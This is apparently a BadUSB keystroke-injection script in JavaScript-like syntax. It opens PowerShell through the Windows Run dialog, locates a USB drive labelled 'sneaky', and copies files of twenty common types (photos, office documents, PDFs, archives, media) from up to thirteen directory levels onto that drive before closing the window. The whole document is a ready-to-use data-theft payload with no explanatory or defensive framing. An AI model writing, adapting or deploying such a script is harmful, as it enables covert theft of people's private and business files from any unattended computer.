layout('de') //set layout de

delay(500)
press("GUI r") //Windows + R
delay(500)
type("powershell\n") //write powershell and press "enter"
delay(1000)

type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'sneaky' } | select name\n")

var filetypes = ["jpg", "jpeg", "png", "gif", "doc", "docx", "mov", "mp4", "mp3", "pdf", "ppt", "ppts", "rar", "wav", "xls", "zip", "txt", "xlsx", "odt", "csv"] //Format

for (var i = 0; i < filetypes.length; i++)
{
	type("copy *." + filetypes[i] + " $usbpath.name\n")
}
for (var i = 0; i < filetypes.length; i++)
{
	type("copy */*." + filetypes[i] + " $usbpath.name\n")
}
for (var i = 0; i < filetypes.length; i++)
{
	type("copy */*/*." + filetypes[i] + " $usbpath.name\n")
}
for (var i = 0; i < filetypes.length; i++)
{
	type("copy */*/*/*." + filetypes[i] + " $usbpath.name\n")
}
for (var i = 0; i < filetypes.length; i++)
{
	type("copy */*/*/*/*." + filetypes[i] + " $usbpath.name\n")
}
for (var i = 0; i < filetypes.length; i++)
{
	type("copy */*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")
}
for (var i = 0; i < filetypes.length; i++)
{
	type("copy */*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")
}
for (var i = 0; i < filetypes.length; i++)
{
	type("copy */*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")
}
for (var i = 0; i < filetypes.length; i++)
{
	type("copy */*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")
}
for (var i = 0; i < filetypes.length; i++)
{
	type("copy */*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")
}
for (var i = 0; i < filetypes.length; i++)
{
	type("copy */*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")
}
for (var i = 0; i < filetypes.length; i++)
{
	type("copy */*/*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")
}
for (var i = 0; i < filetypes.length; i++)
{
	type("copy */*/*/*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")
}

type("exit\n") //exit
